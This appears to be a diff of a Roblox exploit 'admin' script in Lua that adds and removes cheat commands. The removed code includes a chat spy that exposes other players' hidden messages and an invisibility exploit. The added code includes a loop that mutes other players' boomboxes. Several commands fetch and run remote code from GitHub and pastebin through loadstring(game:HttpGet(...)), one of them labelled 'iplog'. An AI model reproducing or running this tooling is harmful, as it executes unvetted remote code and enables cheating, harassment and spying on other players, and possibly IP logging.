-									game:GetService("TextChatService").TextChannels.RBXGeneral:DisplaySystemMessage("{SPY "..(enabled and "EN" or "DIS").."ABLED}")
-								end
-							elseif enabled and (spyOnMyself==true or p~=player) then
-								msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
-								local hidden = true
-								local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
-									if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
-										hidden = false
-									end
-								end)
-								wait(1)
-								conn:Disconnect()
-								if hidden and enabled then
-									if public then
-										saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
-									else
-										privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
-										if game:GetService("TextChatService").ChatVersion == "LegacyChatService" then
-											StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
-										else
-											game:GetService("TextChatService").TextChannels.RBXGeneral:DisplaySystemMessage("{SPY} ["..p.Name.."]: "..msg)
+					if Noclipping then
+						Noclipping:Disconnect()
+					end
+					Clip = true
+
+					if flingDied then
+						flingDied:Disconnect()
+					end
+					flinging = false
+					task.wait(.1)
+					local speakerChar = game:GetService("Players").LocalPlayer.Character
+					if not speakerChar or not getRoot(speakerChar) then return end
+					for i,v in pairs(getRoot(speakerChar):GetChildren()) do
+						if v.ClassName == 'BodyAngularVelocity' then
+							v:Destroy()
+						end
+					end
+					for _, child in pairs(speakerChar:GetDescendants()) do
+						if child.ClassName == "Part" or child.ClassName == "MeshPart" then
+							child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
+						end
+					end
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.loopmuteradio) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					task.spawn(function()
+						Username = arg1
+						if Username == "all" or Username == "others" then
+							Loopmute = true
+							repeat task.wait()
+								local players = game:GetService("Players"):GetPlayers()
+								for _, player in ipairs(players) do
+									for _, object in ipairs(player.Character:GetDescendants()) do
+										if object:IsA("Sound") and object.Playing then
+											object:Stop()
 										end
 									end
+									local backpack = player:FindFirstChildOfClass("Backpack")
+									if backpack then
+										for _, object in ipairs(backpack:GetDescendants()) do
+											if object:IsA("Sound") and object.Playing then
+												object:Stop()
+											end
+										end
+									end
+								end	
+							until Loopmute == false
+						else
+							Loopmute = true
+							local players = getPlr(Username)
+							repeat task.wait()
+
+								if players ~= nil then
+									for i, x in next, players.Character:GetDescendants() do
+										if x:IsA("Sound") and x.Playing == true then
+											x.Playing = false
+										end
+									end
+									for i, x in next, players:FindFirstChildOfClass("Backpack"):GetDescendants() do
+										if x:IsA("Sound") and x.Playing == true then
+											x.Playing = false
+										end
+									end
+								end 
+							until Loopmute == false
+							if game:GetService("SoundService").RespectFilteringEnabled == true then
+								print("Boombox loop muted as Client")
+							else
+								if game:GetService("SoundService").RespectFilteringEnabled == false then
+									print("Boombox loop muted as FE")
 								end
 							end
 						end
-					end
-	
-					for _,p in ipairs(Players:GetPlayers()) do
-						p.Chatted:Connect(function(msg) onChatted(p,msg) end)
-					end
-					Players.PlayerAdded:Connect(function(p)
-						p.Chatted:Connect(function(msg) onChatted(p,msg) end)
 					end)
-					privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
-					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
-					if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
-					local chatFrame = player.PlayerGui.Chat.Frame
-					chatFrame.ChatChannelParentFrame.Visible = true
-					chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
+					local plrs = game:GetService("Players"):FindFirstChild(arg1)
+					if arg1 ~= plrs.Name then
+						output.Text = "Error: Player not found."
+						task.wait(4)
+						output.Text = ""
+					elseif arg1 == plrs.Name then
+						output.Text = "Checking Console tells you that it's FE or Client. (What it means is RespectFilteringEnabled in Sound Service is on or off.)"
+						task.wait(4)
+						output.Text = ""
+					end
 				end)
-			elseif args[1] == prefix.."translator" then
-				pcall(function()
-					loadstring(
-	      --[[
-	
-	      ░░░░░██╗  ███╗░░░███╗███████╗███╗░░░███╗███████╗
-	      ░░░░░██║  ████╗░████║██╔════╝████╗░████║██╔════╝
-	      ░░░░░██║  ██╔████╔██║█████╗░░██╔████╔██║█████╗░░
-	      ██╗░░██║  ██║╚██╔╝██║██╔══╝░░██║╚██╔╝██║██╔══╝░░
-	      ╚█████╔╝  ██║░╚═╝░██║███████╗██║░╚═╝░██║███████╗
-	      ░╚════╝░  ╚═╝░░░░░╚═╝╚══════╝╚═╝░░░░░╚═╝╚══════╝
-	
-	
-	      Keybind:
-	     
-	      - Semicolon // To trigger chat box
-	      - Enter // To submit your chat
-	      - Click on player chat // To view his translation
-	      - Quote // To hide/show UI
-	     
-	      Next Update:
-	     
-	      - Ill make it so it auto detects language of chat upon click
-	      - yes thats it
-	      --]]
-	
-						game:HttpGet(
-							'https://raw.githubusercontent.com/PivotEngine/cool_scripts/main/Pedro.exe',
-							true
-						)
-					)();
-				end)
-			elseif args[1] == prefix.."invis" then
+			end
+		end
+
+		for _, name in pairs(allcmds.namelessadmin) do
+			if cmd == prefix..name then
 				task.spawn(function()
-	
-					local CS = game:GetService("CollectionService")
-					local UIS = game:GetService("UserInputService")
-	
-					if invisRunning then return end
-					invisRunning = true
-					-- Full credit to AmokahFox @V3rmillion
-					local Player = game.Players.LocalPlayer
-					repeat wait(.1) until game.Players.LocalPlayer.Character
-					local Character = game.Players.LocalPlayer.Character
-					Character.Archivable = true
-					local IsInvis = false
-					local IsRunning = true
-					local InvisibleCharacter = Character:Clone()
-					InvisibleCharacter.Parent = game.Lighting
-					local Void = workspace.FallenPartsDestroyHeight
-					InvisibleCharacter.Name = ""
-					local CF
-	
-					local invisFix = game:GetService("RunService").Stepped:Connect(function()
-						pcall(function()
-							local IsInteger
-							if tostring(Void):find'-' then
-								IsInteger = true
-							else
-								IsInteger = false
-							end
-							local Pos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
-							local Pos_String = tostring(Pos)
-							local Pos_Seperate = Pos_String:split(', ')
-							local X = tonumber(Pos_Seperate[1])
-							local Y = tonumber(Pos_Seperate[2])
-							local Z = tonumber(Pos_Seperate[3])
-							if IsInteger == true then
-								if Y <= Void then
-									Respawn()
-								end
-							elseif IsInteger == false then
-								if Y >= Void then
-									Respawn()
-								end
-							end
-						end)
-					end)
-	
-					for i,v in pairs(InvisibleCharacter:GetDescendants())do
-						if v:IsA("BasePart") then
-							if v.Name == "HumanoidRootPart" then
-								v.Transparency = 1
-							else
-								v.Transparency = .5
-							end
-						end
-					end
-	
-					function Respawn()
-						IsRunning = false
-						if IsInvis == true then
-							pcall(function()
-								Player.Character = Character
-								wait()
-								Character.Parent = workspace
-								Character:FindFirstChildWhichIsA'Humanoid':Destroy()
-								IsInvis = false
-								InvisibleCharacter.Parent = nil
-								invisRunning = false
-							end)
-						elseif IsInvis == false then
-							pcall(function()
-								Player.Character = Character
-								wait()
-								Character.Parent = workspace
-								Character:FindFirstChildWhichIsA'Humanoid':Destroy()
-								TurnVisible()
-							end)
-						end
-					end
-	
-					local invisDied
-					invisDied = InvisibleCharacter:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
-						Respawn()
-						invisDied:Disconnect()
-					end)
-	
-					function TurnVisible()
-						if IsInvis == false then return end
-						invisFix:Disconnect()
-						invisDied:Disconnect()
-						CF = workspace.CurrentCamera.CFrame
-						Character = Character
-						local CF_1 = Player.Character.HumanoidRootPart.CFrame
-						Character.HumanoidRootPart.CFrame = CF_1
-						InvisibleCharacter.Parent = game.Lighting
-						Player.Character = Character
-						Character.Parent = workspace
-						IsInvis = false
-						Player.Character.Animate.Disabled = true
-						Player.Character.Animate.Disabled = false
-						invisDied = Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
-							Respawn()
-							invisDied:Disconnect()
-						end)
-						invisRunning = false
-					end
-	
-	
-	
-					local CS = game:GetService("CollectionService")
-					local UIS = game:GetService("UserInputService")
-	
-					UIS.InputBegan:Connect(function(input, gameProcessed)
-						if input.UserInputType == Enum.UserInputType.Keyboard then
-							if input.KeyCode == Enum.KeyCode.E and not gameProcessed then
-								if IsInvis == false then
-									IsInvis = true
-									CF = game.Workspace.CurrentCamera.CFrame
-									local CF_1 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-									Character:MoveTo(Vector3.new(0,math.pi*1000000,0))
-									game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
-									wait(.1)
-									game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
-									InvisibleCharacter = InvisibleCharacter
-									Character.Parent = game.Lighting
-									InvisibleCharacter.Parent = game.Workspace
-									InvisibleCharacter.HumanoidRootPart.CFrame = CF_1
-									game.Players.LocalPlayer.Character = InvisibleCharacter
-									local workspace = game.Workspace
-									Players = game:GetService("Players")
-									local speaker = game.Players.LocalPlayer
-									workspace.CurrentCamera:remove()
-									wait(.1)
-									game.Workspace.CurrentCamera.CameraSubject = speaker.Character:FindFirstChildWhichIsA('Humanoid')
-									game.Workspace.CurrentCamera.CameraType = "Custom"
-									game.Players.LocalPlayer.CameraMinZoomDistance = 0.5
-									game.Players.LocalPlayer.CameraMaxZoomDistance = 400
-									game.Players.LocalPlayer.CameraMode = "Classic"
-									game.Players.LocalPlayer.Character.Head.Anchored = false
-									game.Players.LocalPlayer.Character.Animate.Disabled = true
-									game.Players.LocalPlayer.Character.Animate.Disabled = false
-								elseif IsInvis == true then
-									TurnVisible()
-									IsInvis = false
-								end
-							end
-						end
-					end)
-					
-					local ScreenGui = Instance.new("ScreenGui")
-					local TextButton = Instance.new("TextButton")
-					local UICorner = Instance.new("UICorner")
-					local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
-	
-					--Properties:
-	
-					ScreenGui.Parent = game.CoreGui
-					ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-					ScreenGui.ResetOnSpawn = false
-	
-					TextButton.Parent = ScreenGui
-					TextButton.BackgroundColor3 = Color3.fromRGB(12, 4, 20)
-					TextButton.BackgroundTransparency = 0.140
-					TextButton.Position = UDim2.new(0.933, 0,0.621, 0)
-					TextButton.Size = UDim2.new(0.043, 0,0.083, 0)
-					TextButton.Font = Enum.Font.SourceSansBold
-					TextButton.Text = "Become Invisible"
-					TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-					TextButton.TextSize = 15.000
-					TextButton.TextWrapped = true
-					TextButton.Active = true
-					TextButton.Draggable = true
-					TextScaled = true
-	
-					UICorner.Parent = TextButton
-	
-					UIAspectRatioConstraint.Parent = TextButton
-					UIAspectRatioConstraint.AspectRatio = 1.060
-	
-					-- Scripts:
-	
-					local function FEPVI_fake_script() -- TextButton.LocalScript 
-						local script = Instance.new('LocalScript', TextButton)
-	
-						IsInvis = false
-						script.Parent.MouseButton1Click:Connect(function()
-							if IsInvis == false then
-								IsInvis = true
-								CF = game.Workspace.CurrentCamera.CFrame
-								local CF_1 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-								Character:MoveTo(Vector3.new(0,math.pi*1000000,0))
-								game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
-								wait(.1)
-								game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
-								InvisibleCharacter = InvisibleCharacter
-								Character.Parent = game.Lighting
-								InvisibleCharacter.Parent = game.Workspace
-								InvisibleCharacter.HumanoidRootPart.CFrame = CF_1
-								Player.Character = InvisibleCharacter
-								local workspace = game.Workspace
-								Players = game:GetService("Players")
-								local speaker = game.Players.LocalPlayer
-								workspace.CurrentCamera:remove()
-								wait(.1)
-								game.Workspace.CurrentCamera.CameraSubject = speaker.Character:FindFirstChildWhichIsA('Humanoid')
-								game.Workspace.CurrentCamera.CameraType = "Custom"
-								game.Players.LocalPlayer.CameraMinZoomDistance = 0.5
-								game.Players.LocalPlayer.CameraMaxZoomDistance = 400
-								game.Players.LocalPlayer.CameraMode = "Classic"
-								game.Players.LocalPlayer.Character.Head.Anchored = false
-								game.Players.LocalPlayer.Character.Animate.Disabled = true
-								game.Players.LocalPlayer.Character.Animate.Disabled = false
-								script.Parent.Text = "Become Visible"
-							elseif IsInvis == true then
-								TurnVisible()
-								IsInvis = false
-								script.Parent.Text = "Become Invisible"
-							end
-						end)
-					end
-					coroutine.wrap(FEPVI_fake_script)()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))()
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.scpfuturistic) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/TheEGodOfficial/scp_futuristic_gui_v2/refs/heads/main/Source.lua"))()
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.unloopmuteradio) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					Loopmute = false
+					print("Muted Boomboxes are now able to be used.")
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.unglitchradio) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					Loopglitch = false
+					print("Glitched Boomboxes are now able to be used.")
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.animlogs) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://pastebin.com/raw/mPwkmXq7"))()
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.iplog) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://pastebin.com/raw/Fi7ARPBj"))()
 				end)
 			end
 		end
 	end)
-end
-local function AMFF_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
+end;
+task.spawn(C_c);
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.maininfo
+local function C_67()
+	local script = G2L["67"];
+	-- rewritten by E God
 
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function MRQTJE_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd1"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
+	for _, cmds in pairs(script.Parent:GetChildren()) do
+		if cmds:IsA("TextButton") and cmds:FindFirstChild("Info") then
+			local db = false
+			cmds.MousButton1Click:Connect(function()
+				if db == true then
+					return
+				end
+				db = true
+				local backupmsg = cmds.Text
+				print(cmds.Info.Value)
+				game:GetService("RunService").RenderStepped:Wait()
+				cmds.Text = "Check Console for info on the command. (mobile: /console, computer: F9)"
+				task.wait(3)
+				cmds.Text = backupmsg
+				game:GetService("RunService").RenderStepped:Wait()
+				db = false
+			end)
+		end
+	end
+end;
+task.spawn(C_67);
 
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function CTCU_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd2"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function OKZMXS_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd3"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function GOZYZ_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd4"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function WVKNMU_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd5"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function FDYLHES_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd6"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function BPFEH_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd7"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function SFTM_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd8"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function ACUEPA_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd9"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function CVWCXI_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd10"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function FJADCS_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd11"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function LNGZZGW_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd12"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function USNNITV_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd13"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function XTRI_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd14"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function SVZYGA_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd15"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function QHIXJX_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd16"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function ASWKXV_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd17"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function LPCE_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd18"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
